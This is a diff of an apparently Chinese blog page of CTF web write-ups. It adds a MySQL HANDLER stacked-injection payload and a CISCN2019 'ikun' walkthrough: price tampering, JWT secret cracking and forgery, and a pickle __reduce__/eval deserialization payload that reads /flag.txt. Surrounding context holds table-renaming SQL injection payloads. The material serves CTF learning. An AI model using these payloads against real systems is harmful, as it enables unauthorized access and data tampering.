@@ -100,7 +100,7 @@
           <!-- Date -->
           <span class="date-time info">On
             <span class="date">2018-10-15</span>
-            <span class="time">03:23:08</span>
+            <span class="time">06:26:35</span>
           </span>
           
           <!--  Categories  -->
@@ -169,6 +169,7 @@ in_array 中的 <span class="hljs-variable">_page</span> 为 <span class="hljs-b
 <h1 id="强网杯-随便注"><a href="#强网杯-随便注" class="headerlink" title="强网杯 随便注"></a>强网杯 随便注</h1><p>又是涨知识的一道题，这道题用了堆叠注入,就是分开查询,因为这道题都过滤了<br><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code><br>所以就想到堆叠注入<br><code>1&#39;;show databases;#</code><br><code>1&#39;;show tables;#</code><br><code>1&#39;;show columns from xxxxx;#</code><br>因为这里有两张表，回显内容肯定是从word这张表中回显的，那我们怎么才能让它回显flag所在的表呢<br>我们首先要把第一个表名改成其他的,把有flag的表名改成默认的查询的表这里也就是word表,在把flag换成id或者data因为不知道后台代码 where id=’xxxx’或data=’xxxx’<br>MySQL中反引号和单引号的区别与用法<br>    MySql 中用一对反引号来标注 SQL 语句中的标识，如数据库名、表名、字段名等<br>    引号则用来标注语句中所引用的字符型常量或日期/时间型常量，即字段值<br>    例如：select * from <code>username</code> where <code>name</code>=”peri0d”<br>    MySQL 的 show、rename 和 alter 命令<br>    show 可以用于查看当前数据库，当前表，以及表中的字段<br>    rename 用于修改 table 的名称<br>    alter 用于修改表中字段的属性<br>攻击思路：默认查询 words 表，可以将数字表的名称改成 words，这样就可以 使用 or ‘1’=’1 直接查询 flag 了<br>payloads</p>
 <pre><code class="hljs undefined">?inject=1';<span class="hljs-keyword">RENAME</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-string">`words`</span> <span class="hljs-keyword">TO</span> <span class="hljs-string">`words1`</span>;<span class="hljs-keyword">RENAME</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-string">`1919810931114514`</span> <span class="hljs-keyword">TO</span> <span class="hljs-string">`words`</span>;<span class="hljs-keyword">ALTER</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-string">`words`</span> <span class="hljs-keyword">CHANGE</span> <span class="hljs-string">`flag`</span> <span class="hljs-string">`id`</span> <span class="hljs-built_in">VARCHAR</span>(<span class="hljs-number">100</span>) <span class="hljs-built_in">CHARACTER</span> <span class="hljs-keyword">SET</span> utf8 <span class="hljs-keyword">COLLATE</span> utf8_general_ci <span class="hljs-keyword">NOT</span> <span class="hljs-literal">NULL</span>;<span class="hljs-keyword">show</span> <span class="hljs-keyword">columns</span> <span class="hljs-keyword">from</span> words;%23</code></pre>
 
+<p>如果重复名用不了<br><code>1&#39;; handler 列名 open as disshu; handler disshu read first; handler disshu close;#</code></p>
 <h1 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h1><p>这道题是服务器模版注入攻击<br>然而我们是怎么判断的呢,因为参数后面的内容就是回显的内容,再加一点他是render渲染的就更加明确了这一点<br><code>$temp-&gt;render(&quot;Hello &quot;.$_GET[&#39;username&#39;]);</code><br>通过查阅在handler指向的处理当前这个页面的RequestHandler对象，<br>RequestHandler.settings指向self.application.settings，<br>因此handler.settings指向RequestHandler.application.settings。</p>
 <h1 id="easy-sql"><a href="#easy-sql" class="headerlink" title="easy sql"></a>easy sql</h1><p>利用mysqli_multi_query()函数就支持多条sql语句同时执行,所以看到这个就要用堆叠注入<br>源码</p>
 <pre><code class="hljs undefined">$sql = <span class="hljs-string">"select "</span>.$post[<span class="hljs-string">'query'</span>].<span class="hljs-string">"||flag from Flag"</span><span class="hljs-comment">;</span>
@@ -440,6 +441,46 @@ def getUrl():
 <span class="hljs-meta">?&gt;</span></span></code></pre>
 
 <p>反序列化<br>$flag=new Flag();<br>$flag=serialize($flag);<br>echo $flag;<br>然后传参即可<br>注意一点当我们最终传参的时候php的参数不要再用伪协议因为已经读完了</p>
+<h1 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h1><p>这两天忙着上课,得空做了一道ctf<br>这题三个考点：<br>1.逻辑漏洞<br>2.jwt伪造<br>3.python反序列化<br>首先要我们购买lv6的东西<br>我们直接抓包改包修改折扣,但是不能为0,所以我们设为很小0.00000000001<br>之后让我们以admin登陆,第一想法是改cookie<br>这时候肯定是想着去看cookie值，在哪里把用户名进行替换<br>可以看上面上面的图，里面的cookie里面有JWT（JSON Web Token），我这样的菜鸡也是第一次遇到…查了下JWT，然后知道可以解析看看<br><a href="http://jwt.io" target="_blank" rel="noopener">http://jwt.io</a><br>用 c-jwt-cracker来跑密钥<br>然后修改键值为admin,更换cookie。<br>skip一大堆,下面说重点代码审计<br>python的,遇见的不多</p>
+<pre><code class="hljs undefined"><span class="hljs-keyword">import</span> tornado.web
+<span class="hljs-keyword">from</span> sshop.base <span class="hljs-keyword">import</span> BaseHandler
+<span class="hljs-keyword">import</span> pickle
+<span class="hljs-keyword">import</span> urllib
+
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">AdminHandler</span><span class="hljs-params">(BaseHandler)</span>:</span>
+<span class="hljs-meta">    @tornado.web.authenticated</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get</span><span class="hljs-params">(self, *args, **kwargs)</span>:</span>
+        <span class="hljs-keyword">if</span> self.current_user == <span class="hljs-string">"admin"</span>:
+            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'form.html'</span>, res=<span class="hljs-string">'This is Black Technology!'</span>, member=<span class="hljs-number">0</span>)
+        <span class="hljs-keyword">else</span>:
+            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'no_ass.html'</span>)
+
+<span class="hljs-meta">    @tornado.web.authenticated</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">post</span><span class="hljs-params">(self, *args, **kwargs)</span>:</span>
+        <span class="hljs-keyword">try</span>:
+            become = self.get_argument(<span class="hljs-string">'become'</span>)
+            p = pickle.loads(urllib.unquote(become))
+            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'form.html'</span>, res=p, member=<span class="hljs-number">1</span>)
+        <span class="hljs-keyword">except</span>:
+            <span class="hljs-keyword">return</span> self.render(<span class="hljs-string">'form.html'</span>, res=<span class="hljs-string">'This is Black Technology!'</span>, member=<span class="hljs-number">0</span>)</code></pre>
+
+<p>看到post这个函数里，首先get_argument是一个框架的内置函数用来获取变量</p>
+<p><code>become = self.get_argument(&#39;become&#39;)</code><br>然后urllib.unquote把字典形式的参数进行url编码，然后pickle.loads对应pickle.dumps，相当于反序列化和序列化</p>
+<p><code>p = pickle.loads(urllib.unquote(become))</code><br>现在我们要构造become的值查看flag.txt<br>当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。<br><em>reduce</em> 被定义之后，当对象被Pickle时就会被调用。<br>先看看<strong>reduce</strong>的一些定义</p>
+<p>reduce它要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。<br>    这个元组包含2到5个元素，其中包括：<br>    一个可调用的对象，用于重建对象时调用；<br>    一个参数元素，供那个可调用对象使用；<br>    被传递给 setstate 的状态（可选）；一个产生被pickle的列表元素的迭代器（可选）；一个产生被pickle的字典元素的迭代器（可选)<br>根据这个制造payload</p>
+<pre><code class="hljs undefined"><span class="hljs-keyword">import</span> pickle
+<span class="hljs-keyword">import</span> urllib
+
+<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">payload</span><span class="hljs-params">(object)</span>:</span>
+    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__reduce__</span><span class="hljs-params">(self)</span>:</span>
+       <span class="hljs-keyword">return</span> (eval, (<span class="hljs-string">"open('/flag.txt','r').read()"</span>,))
+
+a = pickle.dumps(payload())
+a = urllib.quote(a)
+<span class="hljs-keyword">print</span> a</code></pre>
+
+<p>reduce返回的是元组<br>我们要返回的是flag.txt的字节流，所以我们需要返回一个元组，这个元组包含两个必选的参数，第一个可调用的对象，我们这里用的eval，第二个参数，我们使用的是open(’/flag.txt’,‘r’).read()</p>
 
         </div>
       </div>
